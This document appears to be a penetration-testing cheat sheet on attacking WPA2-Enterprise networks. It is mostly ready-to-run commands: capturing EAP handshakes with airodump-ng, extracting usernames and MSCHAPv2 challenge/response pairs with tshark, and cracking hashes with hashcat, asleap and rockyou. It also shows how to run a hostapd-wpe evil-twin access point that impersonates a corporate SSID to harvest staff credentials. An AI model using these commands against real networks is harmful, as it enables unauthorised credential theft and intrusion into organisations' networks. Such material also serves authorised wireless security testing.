# WPA2-Enterprise Attacks

Enterprise networks use 802.1X/RADIUS authentication. Capturing the EAP handshake reveals the username and hashed password.

## Understand Enterprise Auth Types
| Type | Security | What's Captured |
|---|---|---|
| EAP-PEAP (most common) | Medium | Username + MSCHAPv2 hash (crackable) |
| EAP-TTLS | Medium | Username + CHAP/MSCHAP hash |
| EAP-TLS | High | Certificate-based (hard to crack) |
| LEAP | Low | Username + LEAP hash (asleap can crack) |

## Enterprise Handshake Capture
```bash
# Same as handshake capture - target the AP and wait for a client to connect
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture wlan0mon

# Convert to hashcat format for EAP
hcxpcaptool -z eapol_hash.hc22000 enterprise_capture-01.cap

# Crack with hashcat (mode 22000 works for EAPOL too)
hashcat -m 22000 eapol_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## EAP Credential Extraction
```bash
# Extract username from .cap
tshark -r capture-01.cap -Y "eap.identity" -T fields -e eap.identity

# Extract MSCHAPv2 challenge/response
tshark -r capture-01.cap -Y "eap.type == 26" -T fields \
  -e eap.peap.mschapv2.challenge \
  -e eap.peap.mschapv2.response
```

## Evil Twin for Enterprise Networks
For enterprise, the evil twin AP must perform RADIUS authentication to capture credentials.

```bash
# Use hostapd-wpe (Wireless Pwnage Edition) - Fake AP with RADIUS
# /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan0
ssid=CorpWiFi
channel=6
hw_mode=g

# Start the fake AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in /tmp/hostapd-wpe-creds.log
cat /tmp/hostapd-wpe-creds.log

# Crack LEAP hashes with asleap
asleap -r /tmp/hostapd-wpe-creds.log -w /usr/share/wordlists/rockyou.txt
```

## Crack MSCHAPv2 Hashes
```bash
# Extract from hostapd-wpe log and crack with john
asleap -C CHALLENGE -R RESPONSE -w /usr/share/wordlists/rockyou.txt

# With hashcat (mode 5500 = NetNTLMv1, mode 5600 = NetNTLMv2)
hashcat -m 5500 mschap_hash.txt /usr/share/wordlists/rockyou.txt
```
